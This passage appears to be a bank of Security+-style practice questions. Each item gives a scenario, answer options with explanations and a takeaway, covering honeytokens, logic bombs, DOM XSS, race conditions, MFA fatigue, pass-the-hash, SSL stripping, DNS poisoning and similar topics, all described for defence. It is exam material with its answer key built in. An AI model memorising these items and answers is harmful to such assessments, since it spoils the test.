options.text: Insert fake customer accounts whose use anywhere triggers an alert
options.why: Planted fake records are honeytokens. They have no legitimate use, so any login, email or card use tied to them proves the data left the building, even if the theft itself was missed.

options.text: Deploy a honeypot server that imitates the production customer database
options.why: A honeypot detects attackers who interact with the decoy server. It says nothing about whether the real database was copied and later used.

options.text: Place a document called customers_full.xlsx on the file server
options.why: A honeyfile alerts when someone opens or copies that file. It does not help if the attacker copies the real database instead.

options.text: Build a honeynet that mirrors the production network segments
options.why: A honeynet studies attacker behavior on decoy systems. It cannot detect later use of data stolen from real systems.

takeaway: Honeypot and honeynet are decoy systems, a honeyfile is a decoy document, and a honeytoken is a decoy piece of data, ideal for detecting use of stolen data.

scenario: An investigation finds that a firewall rule exposing a database was added using the "netadmin" account. Five engineers know that account's password, and the logs show only the account name and a VPN address shared by all of them.
stem: Which change would BEST ensure this question can be answered next time?

options.text: Give each engineer a named account with MFA and retire the shared login
options.why: Accountability depends on tying actions to one person. Unique, strongly authenticated accounts make every log entry attributable.

options.text: Rotate the shared netadmin password monthly and store it in a password vault
options.why: Rotation and vaulting improve password hygiene, but if the account remains shared the logs still cannot say which engineer acted.

options.text: Forward the firewall logs to the SIEM and keep them for seven years
options.why: Longer retention preserves the same unattributable entries. The missing piece is identity, not log storage.

options.text: Require a second engineer to approve every change before it is saved
options.why: Dual control reduces mistakes and fraud, but with a shared account you still cannot prove which two people were involved.

takeaway: No accountability without unique identities. Shared accounts break attribution no matter how good the logging is.

scenario: A company wants to adopt ISO/IEC 27001. Before budgeting, the CISO wants a list of which required controls already exist, which are partly in place, and which are missing, ranked by how far each is from the requirement.
stem: Which activity provides this?

options.text: A gap analysis against the ISO/IEC 27001 requirements
options.why: A gap analysis compares the current state with a target standard and produces exactly this list of missing and partial controls, which then drives the roadmap and budget.

options.text: A quantitative risk assessment that calculates ALE for each asset
options.why: A risk assessment estimates likelihood and impact of threats. It does not map current controls against a specific standard's requirements.

options.text: An external certification audit by an accredited body
options.why: A certification audit judges whether the company already conforms. Doing it before any preparation would just confirm failure, and auditors do not act as consultants.

options.text: A penetration test of the company's internet-facing systems
options.why: A penetration test finds exploitable weaknesses in specific systems. It says little about policies, processes and most of the controls a standard requires.

takeaway: Current state versus a target framework, with a list of what is missing, is a gap analysis.

stem: A security manager is building a control inventory. Which of the following are BOTH technical AND detective controls? (Select TWO.)

options.text: A network IDS that alerts on known exploit signatures
options.why: It is implemented in technology and it identifies attacks without blocking them, so it is technical and detective.

options.text: File integrity monitoring on web server configuration files
options.why: FIM is software that detects unauthorized changes after they occur, which makes it technical and detective.

options.text: An inline IPS that drops packets matching known exploits
options.why: An IPS is technical, but because it blocks traffic it is preventive, not merely detective.

options.text: A quarterly review of user access rights by department managers
options.why: Access reviews do detect problems, but they are carried out by people as a process, so they are operational (or managerial), not technical.

options.text: CCTV cameras with motion-triggered recording at the loading dock
options.why: Cameras are detective, but they are a physical control, not a technical one in CompTIA's categories.

takeaway: Score every control twice: category (technical, managerial, operational, physical) and type (preventive, detective, corrective, deterrent, compensating, directive).

scenario: Bob receives a contract that Alice digitally signed. His software recomputes the document hash, decrypts the signature with the public key it found in Alice's certificate, and the two values do not match.
stem: Which of the following could explain the failure? (Select TWO.)

options.text: The document was altered after Alice signed it
options.why: Any change to the document changes its hash, so it no longer matches the hash recovered from the signature.

options.text: The signature was made with a private key that does not pair with that certificate
options.why: If the signature was created with some other private key, Alice's public key recovers the wrong value. That happens if someone else signed it or Alice used a different key pair.

options.text: Bob's own private key has expired
options.why: Bob's keys are not involved in verifying Alice's signature at all. Verification uses only Alice's public key.

options.text: The document was encrypted with Bob's public key before sending
options.why: Encrypting for confidentiality is separate from signing. Bob would decrypt with his private key first and then verify the signature normally.

options.text: Alice signed the document with her public key instead of her private key
options.why: Signing software signs with the private key. A 'signature' made with a public key is not something that can be produced or verified in this way.

takeaway: A failed signature check means either the content changed or the signer's key does not match the certificate. The verifier only ever uses the signer's public key.

scenario: An approved change will add a new payments service to the server application allow list on 400 servers. The change ticket lists the business owner, test results and a maintenance window.
stem: Which technical implication is MOST important to add to the ticket before implementation?

options.text: Which other services depend on the change and whether any will need a restart
options.why: Allow list changes often require a service or application restart and can break dependent services. Identifying dependencies and restarts is what keeps the maintenance window from turning into an outage.

options.text: The vendor's list of new features included in the payments service
options.why: Feature lists matter to the business, but they are not a technical implication of changing the allow list on 400 servers.

options.text: A note that the change does not need a backout plan because it only adds software
options.why: Every change needs a backout plan. Adding software to an allow list can still break things and may need to be reversed.

options.text: The names of the help desk staff who will answer user calls during the change
options.why: Staffing is useful operational planning, but it does not address the technical risks of modifying the allow list.

takeaway: Change management technical implications include allow and deny lists, restricted activities, downtime, restarts, legacy applications and dependencies.

scenario: A colocation data center has badge readers on every door and a guard at the front desk. Audits keep finding that employees hold the server hall door open for colleagues carrying equipment, so more people enter than badge in.
stem: Which control would MOST effectively enforce one person per badge at the server hall?

options.text: An access control vestibule that admits one badged person at a time
options.why: A vestibule with interlocking doors physically allows only one authenticated person through per badge, so holding the door for someone becomes impossible rather than just against policy.

options.text: A second guard stationed just inside the server hall entrance at all hours
options.why: Another guard adds observation but relies on people enforcing the rule, which is exactly what is already failing with the front-desk guard.

options.text: Signs at the door warning that tailgating is a fireable offense
options.why: Signs are a deterrent or directive control. They do not physically stop a courteous employee from holding the door.

options.text: CCTV that records everyone who enters the server hall
options.why: Cameras are detective: they would show the tailgating after it happens but would not stop it.

takeaway: When the problem is people holding doors, the fix is a control that removes the choice: an access control vestibule.

scenario: Three weeks after a round of layoffs, every server in the finance cluster wipes its data at 00:00 on the first of the month. Forensics finds a scheduled script, created eight months earlier under a database administrator's account, that checks whether that administrator's own account still exists before running the wipe. The administrator was laid off.
stem: Which of the following BEST describes the threat actor and the malware?

options.text: A malicious insider who planted a logic bomb
options.why: The code was planted from inside by someone with legitimate access, and it waited for a condition (the author's account disappearing) before firing. That combination is a malicious insider with a logic bomb.

options.text: A nation-state actor who deployed a wiper worm
options.why: Nothing here spreads on its own, and the trigger tied to one employee's account points to that employee, not to a well-resourced outside group.

options.text: A hacktivist who installed a remote access Trojan
options.why: A RAT gives interactive remote control. This was a dormant script with a trigger condition, and there is no political message or cause.

options.text: An organized crime group running ransomware
options.why: Ransomware encrypts for payment and leaves a ransom note. This simply destroyed data, with no demand and no profit motive.

takeaway: Dormant code waiting for a date or event is a logic bomb, and a trigger tied to a specific employee leaving is the classic insider signature.

scenario: Accounts payable receives an email from a long-standing supplier's real address asking that future payments go to a new bank account. The message continues an existing invoice thread, and it passed SPF, DKIM and DMARC. Two weeks later the supplier says it never sent it.
stem: Which control would MOST likely have prevented the loss?

options.text: Verify bank detail changes by calling the supplier's known number
options.why: The supplier's own mailbox was compromised, so every email check passes. Only verification through a separate, pre-established channel catches a change request that comes from a genuine but hijacked account.

options.text: Set the company's own DMARC policy to reject instead of quarantine for all mail
options.why: DMARC protects against spoofing of the company's own domain. This message came from the supplier's real domain and already passed DMARC.

options.text: Block inbound email that contains links or attachments
options.why: The message needed neither. Business email compromise relies on a convincing request, not on malicious content.

options.text: Require TLS between the company's and the supplier's mail servers
options.why: TLS protects the message in transit. It does nothing about a legitimate mailbox being used by an attacker.

takeaway: When the email is genuinely from the partner's real account (vendor email compromise), technical email authentication passes. Process controls such as out-of-band callback verification are the defense.

scenario: A tester finds that visiting https://app.example/#name= runs script in the browser. The WAF and the server access logs show no sign of the payload, because browsers never send the part after # to the server. The page's JavaScript reads location.hash and writes it into the page with innerHTML.
stem: Which vulnerability is this, and where must it be fixed?

options.text: DOM-based XSS, fixed in the client-side script by using safe text APIs
options.why: The payload never reaches the server; the page's own JavaScript moves untrusted data from the URL fragment into the DOM. The fix is in that script, for example using textContent instead of innerHTML.

options.text: Stored XSS, fixed by sanitizing values before saving them to the database
options.why: Nothing is stored. The payload lives only in the link, and it never reaches the server or the database.

options.text: Reflected XSS, fixed by adding a WAF rule that blocks script tags
options.why: Reflected XSS bounces the payload off the server. Here the server never sees the fragment, which is why the WAF logged nothing and a WAF rule cannot help.

options.text: CSRF, fixed by adding anti-forgery tokens to every form on the page
options.why: CSRF forges a request on the user's behalf. This is script execution in the page, which tokens do not prevent.

takeaway: Reflected: off the server in the response. Stored: saved and served to everyone. DOM-based: entirely in the browser, often from the URL fragment, invisible to the server and WAF.

scenario: A gift card API checks the card balance, then in a separate database call deducts the purchase. A tester sends 40 identical $50 purchases in parallel against a $50 card, and 23 of them succeed.
stem: Which vulnerability did the tester exploit?

options.text: A race condition between the balance check and the deduction
options.why: Parallel requests all pass the check before any deduction lands. This time-of-check to time-of-use gap is fixed by making check and deduct one atomic operation, such as a single conditional update.

options.text: An integer overflow that wraps the balance to a large positive number
options.why: An overflow would need an arithmetic wrap, and repeating the same small request would not trigger one. The issue only appears with concurrency.

options.text: Insecure direct object reference that lets one user spend another's card
options.why: The tester used their own card. The problem is timing, not access to someone else's object.

options.text: A replay attack that resubmits one captured purchase request
options.why: Replaying a request in sequence would fail once the balance hit zero. Success depends on the requests arriving at the same moment.

takeaway: Many simultaneous identical requests that all succeed is the signature of a race condition (TOCTOU). The fix is atomicity, not input validation.

scenario: An employee whose password was leaked receives 30 push notifications from the MFA app at 1 a.m., followed by a text from someone claiming to be IT saying the prompts will stop once one is approved. The employee approves one.
stem: Which change would BEST prevent this attack from succeeding again?

options.text: Require number matching or FIDO2 keys instead of simple push approval
options.why: Number matching makes the user type a code shown on the sign-in screen, which the victim does not have, and FIDO2 cannot be approved remotely at all. Either defeats MFA fatigue.

options.text: Lock the account after five failed password attempts within any ten-minute window
options.why: The attacker already has the correct password, so there are no failed password attempts to count.

options.text: Replace push notifications with one-time codes sent by SMS
options.why: SMS codes can be phished by the same social engineering, or intercepted through SIM swapping, so this weakens rather than fixes MFA.

options.text: Shorten the session lifetime after a successful MFA approval
options.why: A shorter session limits how long the attacker stays in, but they still get in once the push is approved.

takeaway: Push bombing (MFA fatigue) beats simple approve or deny prompts. Number matching or phishing-resistant FIDO2 MFA stops it.

scenario: An attacker steals a forum's user table. Within minutes, most passwords are recovered without any further connection to the forum, because every hash was produced by a single unsalted MD5 pass. Days later, the same email and password pairs are used successfully against a bank's login page.
stem: Which two attacks are described, in order?

options.text: A rainbow table attack, followed by credential stuffing
options.why: Cracking unsalted hashes offline in minutes points to precomputed rainbow tables. Reusing the recovered pairs on another site is credential stuffing.

options.text: Password spraying, followed by a brute force attack
options.why: Spraying is an online attack that tries a few passwords against many accounts. The first attack happened offline against stolen hashes.

options.text: A birthday attack, followed by pass-the-hash
options.why: A birthday attack finds hash collisions, not passwords, and pass-the-hash reuses a hash on the network rather than a password on a website.

options.text: A dictionary attack, followed by password spraying
options.why: Using known pairs on another site is stuffing, not spraying. Spraying does not start from known username and password pairs.

takeaway: Offline plus unsalted plus minutes suggests rainbow tables (beaten by salting). Known pairs replayed on a different service is credential stuffing (beaten by unique passwords and MFA).

scenario: An incident report shows an attacker dumped NTLM hashes from the memory of a help desk workstation where a domain administrator had signed in, then used those hashes to authenticate to servers without cracking them.
stem: Which of the following would MOST directly reduce the chance of this happening again? (Select TWO.)

options.text: Only let domain administrators sign in from dedicated privileged access workstations
options.why: If admin credentials are never entered on ordinary workstations, there is no admin hash in their memory to steal.

options.text: Enable credential protection such as Credential Guard and restrict NTLM use
options.why: Protecting LSASS memory makes hashes much harder to dump, and limiting NTLM removes the protocol that accepts a raw hash as proof of identity.

options.text: Require domain administrator passwords of at least 20 characters
options.why: Pass-the-hash never cracks the password, so its length does not matter once the hash is stolen.

options.text: Add a unique salt to the password hashes stored on the domain controller
options.why: The attacker reused the hash directly, which salting at rest does not prevent, and NTLM authentication does not use salted hashes in that way.

options.text: Force domain administrators to change their password every 30 days
options.why: Rotation shortens how long a stolen hash works, but the attacker used it immediately. It does not stop the theft or reuse.

takeaway: Pass-the-hash is about where privileged credentials are exposed and which protocols accept hashes. Password length, salting and rotation do not stop it.

scenario: EDR shows WINWORD.EXE launching powershell.exe with a long Base64-encoded command, which then loads code into memory. A WMI event subscription relaunches the same command at every logon. Antivirus scans of the disk find nothing malicious.
stem: Which type of malware is this MOST likely to be?

options.text: Fileless malware that lives off the land with PowerShell and WMI
options.why: Encoded PowerShell, code loaded straight into memory and WMI-based persistence, with nothing malicious on disk, are the hallmarks of fileless malware using built-in tools.

options.text: A boot sector virus that loads before the operating system starts
options.why: A boot sector virus modifies the boot record and loads before Windows. Here everything starts from Word after logon.

options.text: A macro virus that copies itself into every Word document on the host
options.why: A macro virus spreads by infecting documents, which a disk scan would find. This activity loads code into memory instead.

options.text: A rootkit that replaces system drivers to hide its own files
options.why: There are no hidden files or replaced drivers to hide. The scan found nothing because nothing was written to disk.

takeaway: Office spawning encoded PowerShell, memory-only payloads and WMI persistence point to fileless malware. Behavior-based EDR and script logging catch it; file scans do not.

scenario: Several Linux web servers show CPU at 98% around the clock, the fans are loud, and response times have tripled. No files have been encrypted or deleted. Each server has a process named kworkerds that makes outbound connections to port 3333.
stem: Which of the following is MOST likely occurring?

options.text: Cryptojacking malware mining cryptocurrency for the attacker
options.why: Constant maximum CPU, a process disguised with a kernel-thread-like name and connections to a mining pool port such as 3333, with no data damage, all point to cryptojacking.

options.text: A distributed denial of service attack against the web application
options.why: A DDoS would show heavy inbound request traffic. Here the load comes from a local process making outbound connections.

options.text: Ransomware that is still encrypting files in the background
options.why: Ransomware generates heavy disk activity and renames or encrypts files. No files have changed.

options.text: A logic bomb waiting for a date before deleting data
options.why: A dormant logic bomb uses almost no resources until it fires. This process is busy all the time.

takeaway: Resource consumption with no damage and outbound connections to a mining pool is cryptojacking; the indicator to remember is unexplained, sustained CPU use.

scenario: A traveler types bank.example into a browser on hotel Wi-Fi. The browser shows http://bank.example with no padlock, although the bank only serves HTTPS. The attacker's machine on the same network had been sending forged ARP replies for the gateway's address.
stem: Which attack is the user experiencing, and what server-side control would BEST have prevented it?

options.text: SSL stripping by an on-path attacker, prevented by HSTS with preloading
options.why: After ARP poisoning put the attacker in the path, they kept the victim on HTTP while talking HTTPS to the bank. HSTS, especially preloaded, makes the browser refuse plain HTTP for that site.

options.text: DNS poisoning of the resolver, prevented by DNSSEC on the bank's zone
options.why: The attacker positioned themselves with ARP, not DNS, and the name still pointed to the real bank. DNSSEC would not stop the downgrade.

options.text: A replay attack against the session, prevented by shorter session lifetimes
options.why: Nothing captured is being resent. The issue is that the connection was never encrypted from the user's side.

options.text: A rogue access point, prevented by WPA3 encryption on the hotel network
options.why: The user was on the real hotel network. WPA3 encrypts over the air but does not stop another client on the same network from poisoning ARP.

takeaway: An HTTP address for a site that only serves HTTPS, plus an on-path position, means SSL stripping. HSTS is the server-side fix.

scenario: A customer viewing invoice 10452 changes the URL to /invoices/10453 and sees another customer's invoice. The application checks that the user is logged in but never checks who owns the invoice.
stem: Which of the following BEST describes this flaw?

options.text: Horizontal privilege escalation through an insecure direct object reference
options.why: The user gains access to another user's data at the same privilege level by changing an object identifier the server does not authorize. That is horizontal escalation via IDOR.

options.text: Vertical privilege escalation through a flaw in the site's broken authentication flow
options.why: Vertical escalation gains a higher role, such as admin. Authentication worked fine; authorization of the specific object did not.

options.text: Directory traversal through manipulation of the requested path
options.why: Traversal uses ../ to reach files outside a folder. Here the user simply requested another valid record ID.

options.text: Session hijacking by reusing another customer's session token
options.why: The attacker used their own session. They never touched another user's token.

takeaway: Same role, someone else's data is horizontal escalation; higher role is vertical. Predictable IDs without ownership checks (IDOR) are the usual cause.

scenario: An agency learns that network cards bought through a gray-market reseller contain modified firmware that beacons out when traffic is quiet. The cards passed the agency's acceptance tests and run the expected firmware version string.
stem: Which control would BEST reduce this specific risk on future purchases?

options.text: Buy through authorized channels and verify the firmware signatures
options.why: Hardware supply chain attacks are reduced by buying from vetted sources and verifying firmware integrity cryptographically, because version strings can be faked.

options.text: Run a credentialed vulnerability scan against each card once it is installed
options.why: A scanner looks for known weaknesses in exposed services. It will not reveal a deliberately implanted, quiet firmware backdoor.

options.text: Place the servers that use the cards in a separate VLAN
options.why: Segmentation limits damage after compromise but does nothing to keep tampered hardware out of the environment.

options.text: Require a longer burn-in test before accepting new hardware
options.why: The implant was designed to pass functional testing and wait for quiet periods, so longer testing is unlikely to catch it.

takeaway: Supply chain risk is managed at the source: vetted suppliers, authorized channels and cryptographic verification of firmware, not just functional testing.

scenario: A WIPS reports two problems. In a conference room, an access point plugged into a wall jack is broadcasting "Guest-Fast" with no encryption; facilities says an employee installed it. In the parking lot, a device is broadcasting the corporate SSID "CorpNet" with a stronger signal than the real access points and is not connected to the wired network.
stem: Which of the following correctly labels the two devices?

options.text: The conference room device is a rogue AP; the parking lot device is an evil twin
options.why: Any unauthorized AP attached to the network is a rogue AP. One that imitates the legitimate SSID to lure clients, usually not connected to the real network, is an evil twin.

options.text: The conference room device is an evil twin; the parking lot device is a rogue AP
options.why: This swaps them. The conference room device uses its own name and is wired into the network, while the parking lot device copies the corporate SSID.

options.text: Both devices are evil twins because both are unauthorized
options.why: Being unauthorized makes a device rogue. Only the one copying the legitimate SSID is an evil twin.

options.text: Both devices are rogue APs, and evil twins only exist on Bluetooth
options.why: Evil twins are a Wi-Fi attack. The parking lot device is a textbook evil twin.

takeaway: Rogue AP: any unauthorized access point (often an inside back door). Evil twin: impersonates a legitimate SSID to capture clients.

scenario: A lab instrument runs an operating system that reached end of support three years ago. The vendor will not certify the instrument on a newer OS, and replacing it costs $2 million. The instrument must send results to a server on the lab network.
stem: Which of the following is the BEST way to reduce the risk?

options.text: Isolate it on its own segment that can reach only the results server
options.why: Unsupported systems cannot be patched, so the best risk reduction is isolation with a tightly scoped rule, which shrinks the attack surface to the one flow the business needs.

options.text: Install the latest antivirus product and schedule daily full scans
options.why: Antivirus may not even support the old OS, and it does nothing about the unpatched operating system vulnerabilities.

options.text: Disable automatic updates so that a broken patch cannot ever affect the instrument
options.why: There are no more patches for an unsupported OS, so this changes nothing about the real risk.

options.text: Accept the risk because the instrument is too expensive to replace
options.why: Acceptance without any controls ignores cheap, effective mitigations such as segmentation that are clearly available.

takeaway: End-of-life systems that cannot be replaced get compensating controls: isolation, strict allow rules and monitoring.

scenario: Users across the company who type the correct address of a payroll site land on a look-alike page. The company's internal recursive resolver returns 203.0.113.50 for the payroll domain, while public resolvers return the real address. Endpoints' hosts files are clean.
stem: Which attack has MOST likely occurred, and what would BEST prevent it?

options.text: DNS cache poisoning of the internal resolver, prevented by DNSSEC validation
options.why: Only the company's resolver hands out the wrong address, so its cache was poisoned. A validating resolver rejects forged answers that lack valid DNSSEC signatures.

options.text: Typosquatting of the payroll domain, prevented by registering similar names
options.why: Users typed the correct name. Typosquatting relies on mistakes in the name.

options.text: ARP poisoning on each user's subnet, prevented by enabling Dynamic ARP Inspection
options.why: ARP poisoning is local to one subnet and would not make the resolver return a different IP address for every user company-wide.

options.text: Domain hijacking at the registrar, prevented by registry lock
options.why: If the domain itself were hijacked, public resolvers would also return the attacker's address. They do not.

takeaway: Wrong answers from one resolver only (public resolvers fine, hosts files clean) point to cache poisoning of that resolver. DNSSEC validation is the fix.

scenario: A building's new smart thermostats arrive with Telnet enabled, a universal default admin password, UPnP turned on and a cloud management portal. They need only to reach the vendor's cloud over HTTPS.
stem: Which of the following hardening steps are MOST important before deployment? (Select THREE.)

options.text: Change the default admin password to a unique strong value per device
options.why: Universal default credentials are exactly what botnets like Mirai log in with. Unique passwords remove that easy entry.

options.text: Disable Telnet and UPnP
options.why: Telnet sends credentials in clear text and UPnP lets devices open firewall ports on their own. Neither is needed for HTTPS to the cloud.

options.text: Place the thermostats on an isolated VLAN allowed only HTTPS to the vendor
options.why: Segmentation with one tight outbound rule limits what a compromised thermostat can reach and matches the only business need.

options.text: Install an endpoint antivirus agent on each thermostat
options.why: Embedded devices rarely support agents, and antivirus does not address the open services and default passwords.

options.text: Rename the thermostats so their model is not obvious on the network
options.why: Renaming is security through obscurity. Scanners fingerprint devices regardless of their names.

options.text: Enable SNMPv1 so the facilities team can monitor them
options.why: SNMPv1 uses clear-text community strings and adds attack surface. It is a hardening step backward.

takeaway: IoT hardening: change defaults, turn off unneeded services, isolate on a segment with least-privilege rules, and keep firmware updated.

scenario: At a trade show, several executives later find that their phones' contact lists and calendar entries appear on a competitor's blog. The phones were left in discoverable Bluetooth mode, and no one clicked a link or installed anything.
stem: Which attack MOST likely occurred?

options.text: Bluesnarfing, which pulls data from a vulnerable Bluetooth device
options.why: Stealing data such as contacts and calendars over Bluetooth, without user interaction, is bluesnarfing.

options.text: Bluejacking, which sends unsolicited messages to nearby devices
options.why: Bluejacking only pushes messages to a device. It does not take data off it.

options.text: An evil twin that captured traffic from the trade show Wi-Fi
options.why: The theft happened over Bluetooth with discoverable phones, not through a Wi-Fi network.

options.text: A watering hole attack on the trade show's mobile app
options.why: No one installed or used an app here, and a watering hole compromises a website the victims visit.

takeaway: Bluejacking sends (annoying), bluesnarfing steals (dangerous). Keep Bluetooth off or non-discoverable in public.

scenario: Engineers at several wind turbine manufacturers are infected after visiting an industry association's website. The site itself is legitimate and correctly spelled, but an attacker added a script that only targets visitors from the manufacturers' IP ranges.
stem: Which attack does this describe?

options.text: A watering hole attack on a site the target group trusts
options.why: Compromising a legitimate site that a specific community visits, and filtering for the intended victims, is a watering hole attack.

options.text: A typosquatting attack using a misspelled association domain
options.why: The domain was the real, correctly spelled one. Typosquatting relies on look-alike names.

options.text: A spear phishing campaign sent to the engineers' inboxes
options.why: Nobody received a message. The victims went to the site on their own.

options.text: A supply chain attack on the turbine manufacturers' vendors
options.why: The association website is not a vendor in the manufacturers' supply chain, and nothing they bought was altered.

takeaway: Watering hole: poison a site the targets already trust and visit, often filtering by visitor IP so only the intended victims are hit.

scenario: Data loss alerts show sales staff uploading customer contracts to a free file-sharing service. The sales director set up the account so the team could share files with clients more easily, and IT was never told. Nobody intended to harm the company.
stem: Which threat actor category BEST fits this situation?

options.text: Shadow IT
options.why: Employees adopting unapproved services to get work done, without IT's knowledge and without malicious intent, is shadow IT.

options.text: Malicious insider
options.why: An insider threat requires intent to harm or steal. These employees were trying to do their jobs.

options.text: Unskilled attacker
options.why: An unskilled attacker is an outsider using borrowed tools to attack. No attacker is involved here.

options.text: Organized crime
options.why: There is no criminal group or profit motive, just an unsanctioned service.

takeaway: Shadow IT is well-meaning use of unapproved technology. The fix is governance and approved alternatives, not treating staff as attackers.

scenario: A packet capture shows a client offering TLS 1.3 and modern cipher suites. Moments later the client reconnects to the same server offering only SSL 3.0, after an on-path device dropped the first connection attempts. The server accepts SSL 3.0.
stem: Which attack is this, and which server-side change BEST prevents it?

options.text: A downgrade attack, prevented by disabling SSL 3.0 and old TLS versions
options.why: Forcing failures until the client falls back to a weak protocol is a downgrade attack (as in POODLE). If the server refuses obsolete versions, there is nothing weak to fall back to.
